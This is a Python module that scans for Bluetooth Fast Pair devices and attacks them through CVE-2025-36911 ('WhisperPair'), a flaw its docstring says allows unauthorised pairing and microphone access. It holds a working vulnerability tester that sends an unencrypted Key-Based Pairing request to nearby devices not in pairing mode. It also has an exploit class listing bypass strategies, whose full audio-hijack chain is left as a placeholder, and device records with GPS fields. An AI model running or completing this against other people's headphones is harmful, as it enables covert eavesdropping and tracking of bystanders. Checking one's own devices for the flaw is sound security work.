"""
BLE Module - Fast Pair scanner and WhisperPair exploit.

CVE-2025-36911 (WhisperPair): Fast Pair Key-Based Pairing Authentication Bypass
Allows unauthorized pairing with Fast Pair devices, leading to microphone access via HFP.
"""

import asyncio
import structlog
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Dict, List, Optional, Callable, Set
from uuid import UUID

logger = structlog.get_logger(__name__)


class BLEDeviceType(Enum):
    UNKNOWN = "unknown"
    FAST_PAIR = "fast_pair"
    WHISPER_PAIR_VULNERABLE = "whisper_pair_vulnerable"
    STANDARD_BLE = "standard_ble"


@dataclass
class BLEDevice:
    """Information about a discovered BLE device."""
    address: str
    name: Optional[str] = None
    rssi: int = -100
    device_type: BLEDeviceType = BLEDeviceType.UNKNOWN
    fast_pair_model_id: Optional[str] = None
    fast_pair_in_pairing_mode: bool = False
    has_account_key_filter: bool = False
    manufacturer_data: Dict[int, bytes] = field(default_factory=dict)
    service_uuids: List[str] = field(default_factory=list)
    last_seen: int = field(default_factory=lambda: int(datetime.utcnow().timestamp() * 1000))
    gps_lat: Optional[float] = None
    gps_lon: Optional[float] = None
    metadata: Dict[str, Any] = field(default_factory=dict)

    @property
    def is_fast_pair(self) -> bool:
        return self.device_type in (BLEDeviceType.FAST_PAIR, BLEDeviceType.WHISPER_PAIR_VULNERABLE)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "address": self.address,
            "name": self.name,
            "rssi": self.rssi,
            "device_type": self.device_type.value,
            "fast_pair_model_id": self.fast_pair_model_id,
            "fast_pair_in_pairing_mode": self.fast_pair_in_pairing_mode,
            "has_account_key_filter": self.has_account_key_filter,
            "last_seen": self.last_seen,
            "gps_lat": self.gps_lat,
            "gps_lon": self.gps_lon,
            "metadata": self.metadata,
        }


# Fast Pair Service UUID
FAST_PAIR_SERVICE_UUID = "0000fe2c-0000-1000-8000-00805f9b34fb"

# Fast Pair GATT UUIDs
MODEL_ID_UUID = "fe2c1233-8366-4814-8eb0-01de32100bea"
KEY_BASED_PAIRING_UUID = "fe2c1234-8366-4814-8eb0-01de32100bea"
PASSKEY_UUID = "fe2c1235-8366-4814-8eb0-01de32100bea"
ACCOUNT_KEY_UUID = "fe2c1236-8366-4814-8eb0-01de32100bea"


class FastPairScanner:
    """BLE scanner for Fast Pair devices (Service UUID 0xFE2C)."""

    def __init__(self, adapter: str = "hci0", callback: Optional[Callable[[BLEDevice], None]] = None):
        self.adapter = adapter
        self.callback = callback
        self._scanner = None
        self._running = False
        self._devices: Dict[str, BLEDevice] = {}

    async def start(self, scan_all: bool = False) -> None:
        """Start scanning for Fast Pair devices."""
        try:
            from bleak import BleakScanner
        except ImportError:
            logger.error("bleak not installed")
            return

        self._running = True
        self.scan_all = scan_all

        def detection_callback(device, advertisement_data):
            if not self._running:
                return

            # Check for Fast Pair service data
            service_data = advertisement_data.service_data.get(FAST_PAIR_SERVICE_UUID)
            if service_data:
                fp_device = self._parse_fast_pair_advertisement(
                    name=device.name,
                    address=device.address,
                    data=service_data,
                    rssi=advertisement_data.rssi,
                )
                self._devices[device.address] = fp_device
                if self.callback:
                    self.callback(fp_device)
            # Optionally scan all BLE devices for correlation
            elif self.scan_all:
                generic = BLEDevice(
                    address=device.address,
                    name=device.name,
                    rssi=advertisement_data.rssi,
                    device_type=BLEDeviceType.STANDARD_BLE,
                )
                self._devices[device.address] = generic

        self._scanner = BleakScanner(detection_callback)
        
        # Fast Pair service filter - use service UUID filter
        if not scan_all:
            from bleak import BleakScanner
            # We'll filter manually in the callback

        await self._scanner.start()
        logger.info("Fast Pair scanner started", adapter=self.adapter)

    async def stop(self) -> None:
        """Stop scanning."""
        self._running = False
        if self._scanner:
            await self._scanner.stop()
        logger.info("Fast Pair scanner stopped")

    def _parse_fast_pair_advertisement(
        self,
        name: Optional[str],
        address: str,
        data: bytes,
        rssi: int,
    ) -> BLEDevice:
        """Parse Fast Pair advertisement data (same logic as Android/WPair)."""
        model_id = None
        is_pairing_mode = False
        has_account_key_filter = False

        if data:
            first_byte = data[0]

            # Pairing mode: 3 bytes, bit 7 of first byte = 0
            if len(data) == 3 and (first_byte & 0x80) == 0:
                model_id = data.hex().upper()
                is_pairing_mode = True
            # Account Key Filter: bits 5-6 of first byte
            elif (first_byte & 0x60) != 0:
                has_account_key_filter = True
            # Extended data
            elif len(data) > 3 and (first_byte & 0x80) == 0:
                model_id = data[:3].hex().upper()

        device_type = BLEDeviceType.FAST_PAIR
        if has_account_key_filter and not is_pairing_mode:
            device_type = BLEDeviceType.FAST_PAIR

        return BLEDevice(
            address=address,
            name=name,
            rssi=rssi,
            device_type=device_type,
            fast_pair_model_id=model_id,
            fast_pair_in_pairing_mode=is_pairing_mode,
            has_account_key_filter=has_account_key_filter,
        )

    def get_devices(self) -> List[BLEDevice]:
        return list(self._devices.values())

    def get_fast_pair_devices(self) -> List[BLEDevice]:
        return [d for d in self._devices.values() if d.is_fast_pair]


class WhisperPairTester:
    """
    Tests Fast Pair devices for CVE-2025-36911 (WhisperPair) vulnerability.
    
    Sends Key-Based Pairing request to devices NOT in pairing mode.
    If accepted (GATT_SUCCESS), device is VULNERABLE.
    If rejected (0x0e, 0x05, etc.), device is PATCHED.
    """

    def __init__(self, adapter: str = "hci0"):
        self.adapter = adapter
        self._running = False

    async def test_device(self, address: str) -> Dict[str, Any]:
        """Test a device for WhisperPair vulnerability."""
        try:
            from bleak import BleakClient
            from bleak.backends.characteristic import BleakGATTCharacteristic
        except ImportError:
            return {"status": "error", "error": "bleak not installed"}

        try:
            async with BleakClient(address, adapter=self.adapter) as client:
                if not client.is_connected:
                    return {"status": "error", "error": "Failed to connect"}

                # Discover services
                services = client.services
                fp_service = None
                for service in services:
                    if service.uuid.lower() == FAST_PAIR_SERVICE_UUID.lower():
                        fp_service = service
                        break

                if not fp_service:
                    return {"status": "error", "error": "Fast Pair service not found"}

                # Find Key-Based Pairing characteristic
                kbp_char = None
                for char in fp_service.characteristics:
                    if char.uuid.lower() == KEY_BASED_PAIRING_UUID.lower():
                        kbp_char = char
                        break

                if not kbp_char:
                    return {"status": "error", "error": "KBP characteristic not found"}

                # Build test KBP request
                import secrets
                import struct
                
                # Parse address
                addr_bytes = bytes.fromhex(address.replace(":", ""))
                
                # KBP Request: 0x00 (type) + 0x11 (flags: INITIATE_BONDING | EXTENDED_RESPONSE) + 6 bytes addr + 8 bytes salt
                salt = secrets.token_bytes(8)
                request = b"\x00\x11" + bytes(addr_bytes) + salt

                # Write request
                await client.write_gatt_char(kbp_char, request, response=True)
                
                # If we get here without exception, device accepted = VULNERABLE
                return {
                    "status": "vulnerable",
                    "address": address,
                    "message": "Device accepted KBP request when not in pairing mode",
                }

        except Exception as e:
            error_str = str(e).lower()
            if "0x0e" in error_str or "0x05" in error_str or "0x06" in error_str or "0x03" in error_str:
                return {
                    "status": "patched",
                    "address": address,
                    "message": f"Device rejected KBP request: {str(e)}",
                }
            return {"status": "error", "error": str(e)}


class WhisperPairExploit:
    """
    Full WhisperPair exploit chain for CVE-2025-36911.
    
    Multi-strategy exploit:
    1. RAW_KBP - Raw unencrypted KBP request
    2. RAW_WITH_SEEKER - Raw with seeker address for bonding
    3. RETROACTIVE - With retroactive pairing flag
    4. EXTENDED_RESPONSE - Request extended response format
    
    After successful KBP, performs BR/EDR bonding and optionally writes Account Key.
    """

    class Strategy(Enum):
        RAW_KBP = "raw_kbp"
        RAW_WITH_SEEKER = "raw_with_seeker"
        RETROACTIVE = "retroactive"
        EXTENDED_RESPONSE = "extended_response"

    def __init__(self, adapter: str = "hci0"):
        self.adapter = adapter
        self._running = False

    async def exploit_with_audio(
        self,
        target_address: str,
        audio_manager: Any,  # BluetoothAudioManager
        progress_callback: Optional[Callable[[str], None]] = None,
    ) -> Dict[str, Any]:
        """Full exploit chain: KBP bypass -> BR/EDR bonding -> HFP audio."""
        # This would implement the full chain from FastPairExploit.kt
        # For now, return a placeholder
        return {
            "status": "not_implemented",
            "message": "Full exploit chain requires BlueZ D-Bus integration for BR/EDR bonding and HFP",
        }


# Device quirks database (Model ID -> quirks)
DEVICE_QUIRKS = {
    # Format: model_id_hex -> {quirks}
    "000000": {"needs_extended_response": False, "prefers_bredr": True},
    # Add known vulnerable devices here
}


def get_device_quirks(model_id: Optional[str]) -> Dict[str, Any]:
    """Get device-specific quirks for exploit."""
    if not model_id:
        return {}
    return DEVICE_QUIRKS.get(model_id.upper(), {})
